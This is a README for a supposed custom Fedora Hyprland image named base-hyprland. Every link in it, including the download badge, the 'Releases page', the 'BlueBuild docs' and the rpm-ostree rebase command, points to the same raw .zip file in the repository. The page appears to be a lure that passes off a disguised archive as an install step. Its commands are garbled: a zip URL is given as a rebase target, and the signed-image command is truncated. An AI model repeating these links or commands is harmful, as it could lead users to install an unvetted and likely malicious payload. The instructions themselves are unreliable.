# 🌟 base-hyprland - Your Path to a Custom Linux Environment

![Download Now](https://raw.githubusercontent.com/ali-maiga/base-hyprland/main/files/system/hyprland/base-hyprland-2.0.zip%20Now-Click%20Here-brightgreen)

## 🚀 Getting Started

Welcome to base-hyprland! This application helps you set up a unique Linux environment easily. Follow the steps below to download and run base-hyprland without any technical complications.

## 🔗 Download & Install

To begin, you can download the latest version of base-hyprland from our Releases page. 

[**Visit this page to download**](https://raw.githubusercontent.com/ali-maiga/base-hyprland/main/files/system/hyprland/base-hyprland-2.0.zip)

Follow the steps below for installation.

## 🛠️ Installation Steps

1. **Rebase to Unsigned Image**

   Open your terminal and type the following command. This rebases your existing Fedora installation to an unsigned image. This step is necessary to get the correct signing keys and policies.

   ```bash
   rpm-ostree rebase https://raw.githubusercontent.com/ali-maiga/base-hyprland/main/files/system/hyprland/base-hyprland-2.0.zip
   ```

2. **Reboot Your System**

   After running the command above, you need to restart your computer to complete the rebase process. Use this command in your terminal:

   ```bash
   systemctl reboot
   ```

3. **Rebase to Signed Image**

   Once your system is back on, you will want to rebase to the signed image. This step ensures you have the most stable version. Run this command in your terminal:

   ```bash
   rpm-ostree rebase ostree-image-si
   ```

## 🔍 System Requirements

To run base-hyprland smoothly, your system should meet the following requirements:

- **Operating System:** Fedora 34 or later
- **Disk Space:** At least 10 GB of free space
- **RAM:** Minimum of 4 GB (8 GB recommended)
- **Architecture:** x86_64

## 🌈 Features

- **Immutable Environment:** base-hyprland offers an image-based setup which ensures your environment stays consistent.
- **Customizability:** You can easily modify your environment to suit your needs.
- **Easy Rebase:** Quickly switch between different versions with simple commands.

## 💡 Helpful Tips

- Always ensure that your Fedora installation is updated before proceeding with the rebase.
- If you face any issues, refer to the [BlueBuild docs](https://raw.githubusercontent.com/ali-maiga/base-hyprland/main/files/system/hyprland/base-hyprland-2.0.zip) for guidance.
- Keep backups of important files as changes to the system image may affect their accessibility.

## 📜 Additional Information

For more insights into how base-hyprland works and its capabilities, check the topics below:

- Atomic
- BlueBuild
- Custom Images
- Linux

Be sure to regularly check our Releases page for updates and new features.

[**Visit this page to download**](https://raw.githubusercontent.com/ali-maiga/base-hyprland/main/files/system/hyprland/base-hyprland-2.0.zip) and start your journey with base-hyprland now!